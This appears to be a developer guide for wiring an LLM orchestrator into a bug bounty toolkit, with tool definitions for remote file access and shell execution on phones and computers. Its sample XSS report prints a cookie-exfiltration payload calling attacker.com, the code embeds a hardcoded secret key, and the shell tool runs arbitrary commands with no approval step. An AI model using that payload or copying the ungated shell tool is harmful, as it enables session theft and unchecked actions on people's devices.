# 🎓 Academy Orchestrator Integration Guide

Complete guide to integrating the iPhone bug bounty toolkit with The Academy orchestrator for autonomous operations.

## 🎯 Overview

The Academy orchestrator can now:
- **Write files** to any connected node (iPhone, Mac, Windows)
- **Read files** from distributed nodes
- **Manage files** across the network
- **Execute GitHub operations** autonomously
- **Spawn shell tasks** via iSH daemon
- **Generate reports** and store them anywhere

## 🚀 Quick Start

### 1. Update academy_orchestrator.py

Add the file write capability to your orchestrator:

```python
import hmac
import hashlib
import json
import requests
from pathlib import Path

# Configuration
SECRET_KEY = b'5fb9c5db0e37d58bf7ef8e86070d545199b587756ed0026330854ab4a023274e'

def sign_message(payload: bytes) -> str:
    """Generate HMAC signature for secure communication"""
    return hmac.new(SECRET_KEY, payload, hashlib.sha256).hexdigest()

def write_file_to_node(node_address: str, path: str, content: str, append: bool = False) -> dict:
    """
    Write content to a file on a remote Academy node

    Args:
        node_address: Node HTTP address (e.g., 'http://192.168.1.100:5000')
        path: File path relative to Documents (e.g., 'BugBounty/reports/xss.md')
        content: File content to write
        append: If True, append to file instead of overwriting

    Returns:
        Response dict with success status
    """
    payload = {
        'path': path,
        'content': content,
        'append': append
    }

    # Sign the payload
    payload_bytes = json.dumps(payload, sort_keys=True).encode('utf-8')
    signature = sign_message(payload_bytes)

    # Send request
    headers = {
        'X-Academy-Signature': signature,
        'Content-Type': 'application/json'
    }

    try:
        response = requests.post(
            f'{node_address}/write_file',
            headers=headers,
            json=payload,
            timeout=30
        )
        response.raise_for_status()
        return response.json()
    except requests.exceptions.RequestException as e:
        return {'error': str(e)}

def read_file_from_node(node_address: str, path: str) -> dict:
    """Read a file from a remote Academy node"""
    payload = {'path': path}
    payload_bytes = json.dumps(payload, sort_keys=True).encode('utf-8')
    signature = sign_message(payload_bytes)

    headers = {
        'X-Academy-Signature': signature,
        'Content-Type': 'application/json'
    }

    try:
        response = requests.post(
            f'{node_address}/read_file',
            headers=headers,
            json=payload,
            timeout=30
        )
        response.raise_for_status()
        return response.json()
    except requests.exceptions.RequestException as e:
        return {'error': str(e)}

def list_files_on_node(node_address: str, path: str = '', pattern: str = '*') -> dict:
    """List files in a directory on a remote node"""
    payload = {'path': path, 'pattern': pattern}
    payload_bytes = json.dumps(payload, sort_keys=True).encode('utf-8')
    signature = sign_message(payload_bytes)

    headers = {
        'X-Academy-Signature': signature,
        'Content-Type': 'application/json'
    }

    try:
        response = requests.post(
            f'{node_address}/list_files',
            headers=headers,
            json=payload,
            timeout=30
        )
        response.raise_for_status()
        return response.json()
    except requests.exceptions.RequestException as e:
        return {'error': str(e)}
```

### 2. Add LLM Tool Definitions

Define tools for the LLM to use:

```python
ACADEMY_TOOLS = [
    {
        "name": "write_text_to_file",
        "description": """
        Writes text content to a specified file on an Academy node (iPhone, Mac, Windows).
        Can create new files or modify existing ones. File type is inferred from path extension.
        Use this to:
        - Save bug reports
        - Store recon results
        - Create logs
        - Save payloads
        - Persist findings
        """,
        "input_schema": {
            "type": "object",
            "properties": {
                "node_id": {
                    "type": "string",
                    "description": "Node identifier (e.g., 'iphone', 'macbook')"
                },
                "path": {
                    "type": "string",
                    "description": "File path relative to Documents (e.g., 'BugBounty/reports/xss_finding.md')"
                },
                "content": {
                    "type": "string",
                    "description": "Text content to write to file"
                },
                "append": {
                    "type": "boolean",
                    "description": "If true, append to file instead of overwriting (default: false)"
                }
            },
            "required": ["node_id", "path", "content"]
        }
    },
    {
        "name": "read_file_from_node",
        "description": "Reads a file from an Academy node and returns its content",
        "input_schema": {
            "type": "object",
            "properties": {
                "node_id": {"type": "string"},
                "path": {"type": "string"}
            },
            "required": ["node_id", "path"]
        }
    },
    {
        "name": "list_files_on_node",
        "description": "Lists files in a directory on an Academy node",
        "input_schema": {
            "type": "object",
            "properties": {
                "node_id": {"type": "string"},
                "path": {"type": "string"},
                "pattern": {"type": "string", "description": "Glob pattern (default: '*')"}
            },
            "required": ["node_id"]
        }
    },
    {
        "name": "github_fetch_file",
        "description": "Fetches a file from GitHub repository via Academy node",
        "input_schema": {
            "type": "object",
            "properties": {
                "node_id": {"type": "string"},
                "repo": {"type": "string", "description": "Repository in format 'owner/repo'"},
                "path": {"type": "string", "description": "File path in repository"},
                "branch": {"type": "string", "description": "Branch name (default: 'main')"}
            },
            "required": ["node_id", "repo", "path"]
        }
    },
    {
        "name": "execute_shell",
        "description": "Executes a shell command via iSH daemon on iPhone",
        "input_schema": {
            "type": "object",
            "properties": {
                "command": {"type": "string"},
                "async": {"type": "boolean", "description": "Run in background"}
            },
            "required": ["command"]
        }
    }
]
```

### 3. Implement Tool Execution

```python
# Node registry
NODES = {
    'iphone': 'http://192.168.1.100:5000',
    'macbook': 'http://192.168.1.75:5000',
    'windows': 'http://192.168.1.50:8000'
}

def execute_tool(tool_name: str, params: dict) -> dict:
    """
    Execute a tool requested by the LLM

    Args:
        tool_name: Name of the tool to execute
        params: Tool parameters

    Returns:
        Execution result
    """
    node_id = params.get('node_id', 'iphone')
    node_address = NODES.get(node_id)

    if not node_address:
        return {'error': f'Unknown node: {node_id}'}

    if tool_name == 'write_text_to_file':
        return write_file_to_node(
            node_address,
            params['path'],
            params['content'],
            params.get('append', False)
        )

    elif tool_name == 'read_file_from_node':
        return read_file_from_node(node_address, params['path'])

    elif tool_name == 'list_files_on_node':
        return list_files_on_node(
            node_address,
            params.get('path', ''),
            params.get('pattern', '*')
        )

    elif tool_name == 'github_fetch_file':
        payload = {
            'repo': params['repo'],
            'path': params['path'],
            'branch': params.get('branch', 'main')
        }
        response = requests.post(
            f'{node_address}/github_fetch_file',
            json=payload,
            timeout=30
        )
        return response.json()

    elif tool_name == 'execute_shell':
        # Via iSH daemon
        from ish_daemon import send_task, wait_for_result

        task_type = 'async' if params.get('async', False) else 'sync'
        task_id = send_task(params['command'], task_type)

        if task_type == 'sync':
            result = wait_for_result(task_id)
            return result
        else:
            return {'task_id': task_id, 'status': 'running'}

    else:
        return {'error': f'Unknown tool: {tool_name}'}
```

## 🛠️ Real-World Use Cases

### Use Case 1: Autonomous Bug Report Generation

**LLM finds XSS vulnerability and autonomously creates report:**

```python
# LLM conversation:
# "I found an XSS vulnerability in the search parameter. Create a report."

# LLM uses write_text_to_file tool:
execute_tool('write_text_to_file', {
    'node_id': 'iphone',
    'path': 'BugBounty/reports/xss_search_2024.md',
    'content': '''# XSS in Search Parameter

## Summary
Reflected XSS vulnerability found in search parameter.

## Vulnerable URL
https://example.com/search?q=<script>alert(1)</script>

## Impact
- Cookie theft via document.cookie
- Session hijacking
- Phishing attacks

## Steps to Reproduce
1. Navigate to https://example.com/search
2. Enter payload: <script>alert(document.cookie)</script>
3. Observe XSS execution

## Proof of Concept
```html
<script>
fetch('https://attacker.com?c=' + document.cookie)
</script>
```

## Recommendation
Implement proper output encoding and CSP headers.

## CVSS Score
7.5 (High)

---
Report generated autonomously by The Academy
Generated: 2024-12-30 15:30:00
'''
})
```

### Use Case 2: Recon Data Management

**LLM performs subdomain enumeration and stores results:**

```python
# 1. LLM runs recon via iSH
execute_tool('execute_shell', {
    'command': 'subfinder -d example.com -silent',
    'async': True
})

# 2. LLM waits and retrieves results
# 3. LLM stores findings
execute_tool('write_text_to_file', {
    'node_id': 'iphone',
    'path': 'BugBounty/recon/example.com_subdomains.txt',
    'content': '\n'.join(subdomains)
})

# 4. LLM creates summary
execute_tool('write_text_to_file', {
    'node_id': 'iphone',
    'path': 'BugBounty/recon/example.com_summary.md',
    'content': f'''# Recon Summary: example.com

Date: {datetime.now().isoformat()}
Subdomains Found: {len(subdomains)}
Live Hosts: {live_count}

## Priority Targets
{priority_list}
'''
})
```

### Use Case 3: Cross-Device Collaboration

**LLM coordinates between iPhone and Mac:**

```python
# 1. Scan from iPhone via iSH
execute_tool('execute_shell', {
    'command': 'nmap -sV example.com -oX /tmp/scan.xml'
})

# 2. Read scan results
scan_result = execute_tool('read_file_from_node', {
    'node_id': 'iphone',
    'path': 'SharedWithiSH/scan.xml'
})

# 3. Analyze on Mac (more powerful)
execute_tool('write_text_to_file', {
    'node_id': 'macbook',
    'path': 'BugBounty/analysis/scan_input.xml',
    'content': scan_result['content']
})

# 4. Run analysis tool on Mac
# 5. Get results and store back on iPhone
```

### Use Case 4: GitHub Code Analysis

**LLM fetches and analyzes security code:**

```python
# 1. Fetch tool from GitHub
code = execute_tool('github_fetch_file', {
    'node_id': 'iphone',
    'repo': 'Peekabot/Couch.Potato',
    'path': 'pythonista-lab/utilities/header_analyzer.py'
})

# 2. Analyze for improvements
# LLM reviews code...

# 3. Write analysis report
execute_tool('write_text_to_file', {
    'node_id': 'iphone',
    'path': 'BugBounty/code_reviews/header_analyzer_review.md',
    'content': '''# Code Review: header_analyzer.py

## Strengths
- Good error handling
- Clear documentation
- Mobile-optimized

## Suggestions
- Add rate limiting
- Implement caching
- Support HTTP/2

## Security Considerations
- Input validation looks good
- Consider adding timeout limits
'''
})
```

### Use Case 5: Automated Daily Logs

**LLM maintains activity logs:**

```python
# Daily log append
execute_tool('write_text_to_file', {
    'node_id': 'iphone',
    'path': 'BugBounty/logs/activity_log.md',
    'content': f'''
## {datetime.now().strftime("%Y-%m-%d")}

- Scanned 5 new targets
- Found 2 potential XSS vulnerabilities
- Submitted 1 bug report
- Updated 3 recon datasets

''',
    'append': True
})
```

## 🔐 Security Features

### HMAC Signature Verification

Every file operation requires a valid HMAC signature:

```python
# Request must include signature
headers = {
    'X-Academy-Signature': hmac_signature,
    'Content-Type': 'application/json'
}

# Node verifies signature before execution
if not verify_signature(payload, signature):
    return 403  # Forbidden
```

### Path Traversal Protection

All file paths are validated:

```python
# Only allows access within Documents directory
base_dir = Path.home() / 'Documents'
full_path = base_dir / user_provided_path

# Verify path is within allowed directory
full_path.resolve().relative_to(base_dir.resolve())
# Raises ValueError if path escapes Documents
```

### Content Sanitization

```python
# Always use UTF-8 encoding
content.encode('utf-8')

# Validate file extensions
allowed_extensions = ['.md', '.txt', '.json', '.py', '.log']
if file_path.suffix not in allowed_extensions:
    raise ValueError('File type not allowed')
```

## 📊 Monitoring & Logging

### Track File Operations

```python
# Add logging to your orchestrator
import logging

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger('academy')

def write_file_to_node(node_address, path, content, append=False):
    logger.info(f"Writing to {node_address}:{path} (append={append}, size={len(content)})")
    # ... execute write ...
    logger.info(f"Write successful: {result}")
```

### File Operation Metrics

```python
# Track statistics
file_ops_stats = {
    'writes': 0,
    'reads': 0,
    'deletes': 0,
    'errors': 0
}

def execute_tool(tool_name, params):
    if tool_name == 'write_text_to_file':
        file_ops_stats['writes'] += 1
    # ... etc
```

## 🎯 Best Practices

### 1. File Organization

```
Documents/
├── BugBounty/
│   ├── reports/
│   │   ├── 2024/
│   │   │   ├── 01_january/
│   │   │   │   ├── xss_example_com.md
│   │   │   │   └── idor_target_com.md
│   │   │   └── 02_february/
│   │   └── templates/
│   ├── recon/
│   │   ├── example.com_subdomains.txt
│   │   ├── target.com_ports.json
│   │   └── summaries/
│   ├── logs/
│   │   ├── activity_log.md
│   │   └── errors.log
│   ├── payloads/
│   │   ├── xss_payloads.txt
│   │   └── sqli_vectors.txt
│   └── code_reviews/
```

### 2. Naming Conventions

```python
# Use descriptive, dated filenames
filename = f"{bug_type}_{target}_{datetime.now().strftime('%Y%m%d')}.md"

# Examples:
# xss_example_com_20241230.md
# idor_api_target_com_20241230.md
# recon_newsite_org_20241230.txt
```

### 3. Content Templates

```python
# Define reusable templates
REPORT_TEMPLATE = '''# {bug_type} - {target}

## Discovered
{date}

## Severity
{severity}

## Description
{description}

## Steps to Reproduce
{steps}

## Impact
{impact}

## Recommendation
{recommendation}
'''

# Use template
content = REPORT_TEMPLATE.format(
    bug_type='XSS',
    target='example.com',
    date=datetime.now().isoformat(),
    severity='High',
    description='...',
    steps='...',
    impact='...',
    recommendation='...'
)
```

### 4. Error Handling

```python
def safe_write_file(node_id, path, content, append=False):
    """Write file with error handling and retry"""
    max_retries = 3

    for attempt in range(max_retries):
        try:
            result = execute_tool('write_text_to_file', {
                'node_id': node_id,
                'path': path,
                'content': content,
                'append': append
            })

            if 'error' in result:
                logger.warning(f"Attempt {attempt + 1} failed: {result['error']}")
                time.sleep(2 ** attempt)  # Exponential backoff
                continue

            return result

        except Exception as e:
            logger.error(f"Exception on attempt {attempt + 1}: {e}")
            time.sleep(2 ** attempt)

    return {'error': 'Max retries exceeded'}
```

## 🚀 Advanced Patterns

### Batch Operations

```python
def write_multiple_files(files: list):
    """Write multiple files in parallel"""
    from concurrent.futures import ThreadPoolExecutor

    with ThreadPoolExecutor(max_workers=5) as executor:
        futures = []
        for file_info in files:
            future = executor.submit(
                write_file_to_node,
                file_info['node'],
                file_info['path'],
                file_info['content']
            )
            futures.append(future)

        results = [f.result() for f in futures]
    return results
```

### File Syncing

```python
def sync_files_between_nodes(source_node, dest_node, pattern='*.md'):
    """Sync files from source to destination node"""
    # 1. List files on source
    files = list_files_on_node(source_node, pattern=pattern)

    # 2. Copy each file
    for file_info in files['files']:
        # Read from source
        content = read_file_from_node(source_node, file_info['path'])

        # Write to destination
        write_file_to_node(dest_node, file_info['path'], content['content'])
```

---

**The Academy now has complete autonomous file management across all nodes! 🎓📱💻**
